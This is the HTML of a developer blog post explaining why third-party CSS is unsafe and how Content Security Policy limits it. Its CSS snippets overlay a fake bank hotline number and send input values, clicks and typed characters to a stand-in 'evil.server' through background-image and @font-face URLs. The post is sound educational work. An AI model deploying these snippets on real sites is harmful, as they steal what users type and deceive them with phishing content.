@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charSet="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <link rel="preconnect dns-prefetch" href="https://www.google-analytics.com" />
+  <link rel="preconnect dns-prefetch" href="https://fonts.googleapis.com" />
+  <link href="https://twitter.com/lihautan" rel="me" />
+  <link rel="manifest" href="/manifest.webmanifest" />
+  <meta name="theme-color" content="#bd93f9" />
+  <link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="icon" href="/icons/icon-48x48.png?v=8d2ab22a78631a892833a1e109f6aba0" />
+  <link rel="preload"
+    href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300&display=swap" as="style"
+    onload="this.rel='stylesheet'">
+  <link rel="webmention" href="https://webmention.io/lihautan.com/webmention" />
+  <link rel="pingback" href="https://webmention.io/lihautan.com/xmlrpc" />
+  <style>
+    html {
+      font-family: 'Lato', sans-serif;
+      font-weight: 300;
+      font-size: 19px;
+      background: linear-gradient(0deg, transparent, #bd93f917, transparent);
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --prism-padding: 20px;
+      --margin: 1.62em;
+      --box-shadow-size: 6px;
+      --box-shadow: var(--box-shadow-size) var(--box-shadow-size) var(--primary-color);
+      --box-shadow-hover: 10px 10px var(--primary-color);
+      --easing: 200ms ease-in-out;
+      --primary-color: #bd93f9;
+      --secondary-color: #9547b7;
+      --dark-color: #282936;
+    }
+  </style>
+
+  
+  <title>Third party CSS is not safe | Tan Li Hau</title><meta name="description" content="" data-svelte="svelte-15e3uyc"><meta name="image" data-svelte="svelte-15e3uyc"><meta name="og:image" data-svelte="svelte-15e3uyc"><meta name="og:title" content="Third party CSS is not safe" data-svelte="svelte-15e3uyc"><meta name="og:description" content="" data-svelte="svelte-15e3uyc"><meta name="og:type" content="website" data-svelte="svelte-15e3uyc"><meta name="twitter:card" content="summary_large_image" data-svelte="svelte-15e3uyc"><meta name="twitter:creator" content="@lihautan" data-svelte="svelte-15e3uyc"><meta name="twitter:title" content="Third party CSS is not safe" data-svelte="svelte-15e3uyc"><meta name="twitter:description" content="" data-svelte="svelte-15e3uyc"><meta name="twitter:image" data-svelte="svelte-15e3uyc"><meta itemprop="url" content="https%3A%2F%2Flihautan.com%2Fthird-party-css-is-not-safe" data-svelte="svelte-15e3uyc"><meta itemprop="image" data-svelte="svelte-15e3uyc"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"Tan Li Hau"},"copyrightHolder":{"@type":"Person","name":"Tan Li Hau"},"copyrightYear":"2020","creator":{"@type":"Person","name":"Tan Li Hau"},"publisher":{"@type":"Person","name":"Tan Li Hau"},"description":"","headline":"Third party CSS is not safe","name":"Third party CSS is not safe","inLanguage":"en"}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","description":"Breadcrumbs list","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","item":{"@id":"https://lihautan.com","name":"Homepage"},"name":"Homepage","position":1},{"@type":"ListItem","item":{"@id":"https%3A%2F%2Flihautan.com%2Fthird-party-css-is-not-safe","name":"Third party CSS is not safe"},"name":"Third party CSS is not safe","position":2}]}</script><link as="script" rel="preload" href="./bd70b9a8.js"><link as="style" rel="preload" href="./assets/blog-base-967d71e9.css"><link as="style" rel="preload" href="./bd70b9a8.css"><link href="./assets/blog-base-967d71e9.css" rel="stylesheet"><link href="./bd70b9a8.css" rel="stylesheet">
+</head>
+
+<body>
+  <div id="app">
+
+<a href="#content" class="skip svelte-9tqnza">Skip to content</a>
+<header class="svelte-f3e4uo"><nav><ul class="svelte-f3e4uo"><li class="svelte-f3e4uo"><a href="/" class="svelte-f3e4uo">Tan Li Hau</a></li>
+    <li class="svelte-f3e4uo"><a href="/about" class="svelte-f3e4uo">About</a></li>
+    <li class="svelte-f3e4uo"><a href="/blogs" class="svelte-f3e4uo">Writings</a></li>
+    <li class="svelte-f3e4uo"><a href="/talks" class="svelte-f3e4uo">Talks</a></li>
+    <li class="svelte-f3e4uo"><a href="/notes" class="svelte-f3e4uo">Notes</a></li>
+    <li class="svelte-f3e4uo"><a href="/newsletter" class="svelte-f3e4uo">Newsletter</a></li>
+    <li class="social svelte-f3e4uo"><a aria-label="Twitter account" href="https://twitter.com/lihautan" class="svelte-f3e4uo"><svg viewBox="0 0 24 24" width="1em" height="1em" class="svelte-f3e4uo"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66
+    10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5
+    4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
+      <a aria-label="Github account" href="https://github.com/tanhauhau" class="svelte-f3e4uo"><svg viewBox="0 0 24 24" width="1em" height="1em" class="svelte-f3e4uo"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0
+    0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07
+    5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65
+    5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42
+    3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></li></ul></nav>
+</header>
+
+<main id="content" class="blog svelte-9tqnza"><h1>Third party CSS is not safe</h1>
+  
+  
+
+  <article><section><ul class="sitemap" id="sitemap" role="navigation" aria-label="Table of Contents"><li><a href="#rd-party">3rd party</a></li><li><a href="#where-does-rd-party-css-come-from">Where does 3rd party CSS come from?</a></li><ul><li><a href="#css-frameworks">1. CSS Frameworks</a></li><li><a href="#third-party-scripts">2. Third party scripts</a></li><li><a href="#browser-extensions">3. Browser extensions</a></li></ul><li><a href="#how-rd-party-css-can-be-unsafe">How 3rd party CSS can be unsafe?</a></li><ul><li><a href="#disappearing-content">Disappearing content</a></li><li><a href="#adding-content">Adding content</a></li><li><a href="#moving-content">Moving content</a></li><li><a href="#reading-attributes">Reading attributes</a></li><li><a href="#monitoring-attributes">Monitoring attributes</a></li><li><a href="#reading-text">Reading text</a></li></ul><li><a href="#content-security-policy">Content Security Policy</a></li><li><a href="#summary">Summary</a></li><li><a href="#further-reading">Further reading</a></li></ul></section>
+<p>Recently, I read <a href="https://jakearchibald.com/2018/third-party-css-is-not-safe/" rel="nofollow">Jake Archibald&#39;s &quot;Third party CSS is not safe&quot;</a>, and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you.</p>
+<section><h2><a href="#rd-party" id="rd-party">3rd party</a></h2>
+<p>If you use assets or APIs from sources that are not provided by yourself, you are using it from a 3rd party. Generally, in a context of a website, this means loading resources that is not from the same domain.</p>
+<p>Jake then gave examples of how 3rd party images and 3rd party scripts could be harmful.</p>
+<p>But, today&#39;s main focus is on 3rd party CSS. So let&#39;s scroll down and see what harm can 3rd party CSS bring.</p></section>
+<section><h2><a href="#where-does-rd-party-css-come-from" id="where-does-rd-party-css-come-from">Where does 3rd party CSS come from?</a></h2>
+<p>Before we dive into what harm can it bring, let&#39;s pause for a moment and think, how does 3rd party CSS get into our web page?</p></section>
+<section><h3><a href="#css-frameworks" id="css-frameworks">1. CSS Frameworks</a></h3>
+<p>Well, if you use frameworks like Bootstrap (I have nothing against using Bootstrap, it&#39;s a great CSS framework), one of the options to adding it to your website is to use one of their CDN links.</p>
+<p><picture><source type="image/webp" srcset="60eb649f71e09997.webp"><source type="image/jpeg" srcset="60eb649f71e09997.png"><img title="null" alt="bootstrap cdn" data-src="60eb649f71e09997.png" loading="lazy"></picture></p>
+<p>This means that you are going to trust the CSS content return from the Bootstrap CDN.</p>
+<p><em>Have you ever take a look at what is contained in the <code>bootstrap.min.css</code> from CDN?</em></p></section>
+<section><h3><a href="#third-party-scripts" id="third-party-scripts">2. Third party scripts</a></h3>
+<p>It&#39;s pretty lame for the 3rd party scripts to do something malicious through a 3rd party CSS, because the scope of influence of a 3rd party scripts is much more than a 3rd party CSS. But nonetheless, it&#39;s worth noting that it is entirely possible that a 3rd party CSS comes from a 3rd party script.</p>
+<p>This begs the question of, where does the 3rd party script come from?</p>
+<p>Well, if you visit any <strong>well-intentioned</strong> <em>*cough*</em> site that tracks your behavior, and if you leave the site halfway through their funnel, they try remind you to through a network of advertisement elsewhere, such as in your search engine, or embedded in your social media, they achieve this through embedding third party scripts.</p>
+<p>Here is a screenshot of list of 3rd party scripts loaded from <a href="https://shopee.sg/" rel="nofollow">https://shopee.sg</a> (an ecommerce site based in South East Asia):</p>
+<p><picture><source type="image/webp" srcset="7f85dfac058d1204.webp"><source type="image/jpeg" srcset="7f85dfac058d1204.png"><img title="null" alt="ads in shopee" data-src="7f85dfac058d1204.png" loading="lazy"></picture></p>
+<p><strong>Disclaimer:</strong> I work for Shopee, I <em>have nothing</em> against all these 3rd party ads, they are what helped us remind buyers to come back and complete their purchase. 🙈</p></section>
+<section><h3><a href="#browser-extensions" id="browser-extensions">3. Browser extensions</a></h3>
+<p>If you are someone who likes to decorate your browser, have a custom theme for all the website you visit, probably you are one of the users of a browser extension!</p>
+<p><picture><source type="image/webp" srcset="475f935654895105.webp"><source type="image/jpeg" srcset="475f935654895105.png"><img title="null" alt="browser extension" data-src="475f935654895105.png" loading="lazy"></picture></p>
+<p>How a browser extension adds a custom theme to any website you visit is to inject a CSS to style them.</p></section>
+<section><h2><a href="#how-rd-party-css-can-be-unsafe" id="how-rd-party-css-can-be-unsafe">How 3rd party CSS can be unsafe?</a></h2>
+<p>Let&#39;s take a look some examples from Jake&#39;s article and try it out ourselves.</p></section>
+<section><h3><a href="#disappearing-content" id="disappearing-content">Disappearing content</a></h3>
+<p>A 3rd party CSS can easily hide content of your website using <code>display: none</code>, and your website will break without you knowing it.</p>
+<p>One example would be hiding a RSVP button from <a href="https://singaporecss.github.io/" rel="nofollow">Singapore CSS website</a>, and the meetup organiser would be scratching their heads wondering why no one signing up for the event! 🤣</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">a.c-rsvp</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p><picture><source type="image/webp" srcset="ab90e311b63f0961.webp"><source type="image/jpeg" srcset="ab90e311b63f0961.png"><img title="null" alt="disappearing content" data-src="ab90e311b63f0961.png" loading="lazy"></picture></p></section>
+<section><h3><a href="#adding-content" id="adding-content">Adding content</a></h3>
+<p>Instead of removing content, a 3rd party CSS can add new content to your website, unpleasant content or confusing content that could drive your visitor away!</p>
+<p>One example would be hiding the text by setting the color to <code>transparent</code>, and replace it with a background image instead!</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">.c-event__content</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://localhost/image.png<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+  <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>
+  <span class="token property">background-size</span><span class="token punctuation">:</span> contain<span class="token punctuation">;</span>
+  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p><picture><source type="image/webp" srcset="c1e616b4133d5873.webp"><source type="image/jpeg" srcset="c1e616b4133d5873.png"><img title="null" alt="adding content" data-src="c1e616b4133d5873.png" loading="lazy"></picture></p>
+<p>Another technique to adding new content is to use the <code>::before</code> or <code>::after</code> psuedo element, as you can add new text via the <code>content</code> property.</p>
+<p>Let&#39;s do a combination of hiding and adding content through CSS:</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">a.c-rsvp::before</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'Snap! Failed to fetch content.'</span><span class="token punctuation">;</span>
+  <span class="token property">margin-right</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.c-rsvp span:first-child</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
+  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
+  <span class="token property">width</span><span class="token punctuation">:</span> 106px<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.c-rsvp span:first-child::after</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'Refresh'</span><span class="token punctuation">;</span>
+  <span class="token property">color</span><span class="token punctuation">:</span> #fafaff<span class="token punctuation">;</span>
+  <span class="token property">left</span><span class="token punctuation">:</span> 12px<span class="token punctuation">;</span>
+  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>Here we hide the event details, change the button text from <strong>&quot;RSVP&quot;</strong> to <strong>&quot;Refresh&quot;</strong>, and somehow we got more people attending the meetup!</p>
+<p><picture><source type="image/webp" srcset="c98964eeeac64936.webp"><source type="image/jpeg" srcset="c98964eeeac64936.png"><img title="null" alt="adding content 2" data-src="c98964eeeac64936.png" loading="lazy"></picture></p>
+<p>A more malicious example would be overlapping a different phone number on top of the hotline number of a bank</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">p.hotline_number</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">p.hotline_number::after</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'(65) 87654321'</span><span class="token punctuation">;</span>
+  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
+  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> #f5f5f5<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p><picture><source type="image/webp" srcset="e5bf5b375e2e2f2d.webp"><source type="image/jpeg" srcset="e5bf5b375e2e2f2d.png"><img title="null" alt="adding content 3" data-src="e5bf5b375e2e2f2d.png" loading="lazy"></picture></p>
+<blockquote><p>The screenshot was taken on my local machine, with a custom setup. No actual harm has done to anyone.</p></blockquote></section>
+<section><h3><a href="#moving-content" id="moving-content">Moving content</a></h3>
+<p>Yet again, we can move the RSVP button around to cover the entire screen. Now clicking anywhere on the site will lead you to the RSVP site.</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">.c-rsvp</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
+  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+  <span class="token property">z-index</span><span class="token punctuation">:</span> 1000<span class="token punctuation">;</span>
+  <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+  <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">.c-rsvp span:first-child</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
+  <span class="token property">box-shadow</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre></section>
+<section><h3><a href="#reading-attributes" id="reading-attributes">Reading attributes</a></h3>
+<p>Using the attribute selector, a 3rd party CSS can style the element differently based on different attribute value.</p>
+<p>One, for example, could load a different background image for different attribute value. By knowing which background image is loaded, one could then know the value of the attribute.</p>
+<p>With enough CSS written, covering all possibile values of the attribute, one could possibly figure out or reduce the search space to figure out the attribute value.</p>
+<p>To make matter worse, some framework, for example React, synchornizes <code>input.value</code> to the <code>&lt;input value=&quot;&quot;&gt;</code> attribute.</p>
+<iframe src="https://codesandbox.io/embed/simple-password-ty7b7?fontsize=14&hidenavigation=1&theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="Simple password" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
+<p>An example of sniffing the attribute value using attribute selector + <code>background-image</code>:</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">input[value$='a']</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?a'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">input[value$='b']</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?b'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">input[value$='c']</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?c'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">input[value$='d']</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?d'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre></section>
+<section><h3><a href="#monitoring-attributes" id="monitoring-attributes">Monitoring attributes</a></h3>
+<p>You can track hover and activations of an element and send that information to the server.</p>
+<pre class="language-css"><code class="language-css"><span class="token selector">a.c-rsvp:hover</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/hover'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token selector">a.c-rsvp:active</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/click'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre></section>
+<section><h3><a href="#reading-text" id="reading-text">Reading text</a></h3>
+<p>If the secret important data on your website is not on the attribute, but rather being part of a text, you may think you are safe from 3rd party CSS, because there&#39;s no inner text selector in CSS.</p>
+<p>However, there&#39;s still tricks up the 3rd party CSS sleeves: <strong>fonts</strong>.</p>
+<p>A 3rd party CSS can declare a <code>font-family</code> that requires a different font file for different character, which means it could be use to determine what are the characters there is in the selected text.</p>
+<p>However, there&#39;s a limitation to this, which is, there&#39;s no way telling the order and number of occurence of the characters. Because, the font files would be cached by the browser, and will not be fetched again with another occurence of the same character.</p>
+<pre class="language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/key=A'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'woff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
+  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/key=B'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'woff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+42<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token selector">element</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>This could be apply to <code>&lt;input&gt;</code> as well. As the user types in their confidential information, character by character, the browser fetches the font file, and the <code>evil.server</code> will know which characters the user has typed into the input.</p></section>
+<section><h2><a href="#content-security-policy" id="content-security-policy">Content Security Policy</a></h2>
+<p>While I was trying to reading attributes from a local bank website, (to try out the feasibility of the techniques above), I couldn&#39;t load the background image from my <code>localhost</code> server.</p>
+<p><picture><source type="image/webp" srcset="d3a8c5077b019f74.webp"><source type="image/jpeg" srcset="d3a8c5077b019f74.png"><img title="null" alt="content security policy" data-src="d3a8c5077b019f74.png" loading="lazy"></picture></p>
+<p>It says my request to my image gets blocked by <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">Content Security Policy</a>.</p>
+<p>So I checked the response of the webpage, and found out the following CSP header in the network tab.</p>
+<p><picture><source type="image/webp" srcset="934f489599ec74f5.webp"><source type="image/jpeg" srcset="934f489599ec74f5.png"><img title="null" alt="content security policy" data-src="934f489599ec74f5.png" loading="lazy"></picture></p>
+<p>In the header, it specifies allow-list of domains / subdomains for specific type of asset. For example, in the following CSP</p>
+<pre class="language-null">
+<code class="language-">img-src &#39;self&#39; *.gstatic.com;
+style-src &#39;self&#39;;</code></pre>
+<p>it allows image source from the site&#39;s own origin and subdomain in <code>gstatic.com</code>, and only styles from the site&#39;s own origin.</p>
+<p>Any styles or image source beyond the list will be blocked by the browser.</p></section>
+<section><h2><a href="#summary" id="summary">Summary</a></h2>
+<p>Third party CSS is not absolutely safe, where you can trust them blindly. It can modify, remove or add content to your site, which may indirectly reducing trust of your users to your site.</p></section>
+<section><h2><a href="#further-reading" id="further-reading">Further reading</a></h2></section></article></main>
+
+<footer class="svelte-9tqnza"><div class="form svelte-1k1s1co"><h1>Subscribe to my newsletter</h1>
+  <h2 class="svelte-1k1s1co">Get the latest blog posts and project updates delivered right to your inbox</h2>
+  <form action="https://buttondown.email/api/emails/embed-subscribe/lihautan" method="post" target="popupwindow" onsubmit="window.open('https://buttondown.email/lihautan', 'popupwindow')" class="embeddable-buttondown-form"><div class="form-item svelte-1k1s1co"><input type="email" name="email" id="bd-email" aria-label="email address" placeholder="youremail@example.com" class="svelte-1k1s1co">
+      <input type="submit" value="Subscribe" disabled class="svelte-1k1s1co"></div>
+    <input type="hidden" value="1" name="embed" class="svelte-1k1s1co">
+    <p class="svelte-1k1s1co">Powered by Buttondown.</p></form>
+</div>
+  
+</footer><script src="./bd70b9a8.js" async></script></div>
+  
+
+  <script>if ('serviceWorker' in navigator) { window.addEventListener('load', function () { navigator.serviceWorker.register('/sw.js'); }); }</script>
+  <script>(function (i, s, o, g, r, a, m) { i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () { (i[r].q = i[r].q || []).push(arguments) }, i[r].l = 1 * new Date(); a = s.createElement(o), m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m) })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga'); if (typeof ga === "function") { ga('create', 'UA-135921142-1', 'auto', {}); }</script>
+  <script>if ('loading' in HTMLImageElement.prototype) { const images = document.querySelectorAll('img[loading="lazy"]'); images.forEach(img => { img.src = img.dataset.src; }); } else { const script = document.createElement('script'); script.src = 'https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js'; document.body.appendChild(script); }</script>
+</body>
+
+</html>
